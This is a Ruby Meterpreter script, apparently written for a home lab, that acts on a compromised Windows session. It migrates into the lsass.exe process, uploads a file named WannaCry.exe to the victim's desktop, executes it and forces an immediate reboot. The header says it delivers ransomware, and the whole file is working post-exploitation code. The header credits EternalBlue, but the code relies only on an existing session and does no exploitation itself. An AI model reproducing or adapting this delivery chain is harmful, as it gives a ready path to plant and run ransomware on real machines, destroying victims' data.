# upload_and_execute.rb - Meterpreter script to upload a file from the attacking machine to the victim machine and execute it using the EternalBlue vulnerability.
# This is a script I made for demonstrative purposes. This script with will upload and execute ransomware on a victims-computer.
# This is made in a completely isolated lab and the "WannaCry.exe" is not provided nor will it.

# Use this with CAUTION.


# Specify the local file path (on the attacking machine) and the remote file path (on the victim machine)
local_file_path = "/home/jml/ETERNALBLUE-LAB/WannaCry.exe"
remote_file_path = "C:\\Users\\morty\\Desktop\\WannaCry.exe"

# Get the session
session = client

# Check if the session is alive
if session.nil? || !session.sys.process.getpid
  print_error("Session is not alive. Exiting.")
  exit
end

# Find the PID of lsass.exe
lsass_pid = nil
print_status("Finding lsass.exe...")
begin
  session.sys.process.get_processes.each do |process|
    if process['name'].casecmp('lsass.exe').zero?
      lsass_pid = process['pid']
      break
    end
  end
  if lsass_pid.nil?
    print_error("lsass.exe not found. Exiting.")
    exit
  else
    print_good("lsass.exe found with PID: #{lsass_pid}")
  end
rescue Rex::Post::Meterpreter::RequestError => e
  print_error("Error finding lsass.exe: #{e.message}")
  exit
end

# Migrate to lsass.exe
print_status("Migrating to lsass.exe...")
begin
  session.core.migrate(lsass_pid)
  print_good("Migrated successfully to lsass.exe (PID: #{lsass_pid})")
rescue Rex::Post::Meterpreter::RequestError => e
  print_error("Error migrating to lsass.exe: #{e.message}")
  exit
end

# Upload the file
print_status("Uploading #{local_file_path} to #{remote_file_path}...")
begin
  session.fs.file.upload_file(remote_file_path, local_file_path)
  print_good("File uploaded successfully.")
rescue Rex::Post::Meterpreter::RequestError => e
  print_error("Error uploading file: #{e.message}")
  exit
end

# Execute the uploaded file
print_status("Executing #{remote_file_path}...")
begin
  session.sys.process.execute("cmd.exe /c start #{remote_file_path}", nil)
  print_good("File executed successfully.")
rescue Rex::Post::Meterpreter::RequestError => e
  print_error("Error executing file: #{e.message}")
end

# Forcing a reboot
print_status("Forcing a reboot..")
begin
  session.sys.process.execute("shutdown.exe /r /t 0", nil)
  sleep(10)
  print_good("Reboot success!")
rescue Rex::Post::Meterpreter::RequestError => e
  print_error("Could not reboot: #{e.message}")
end
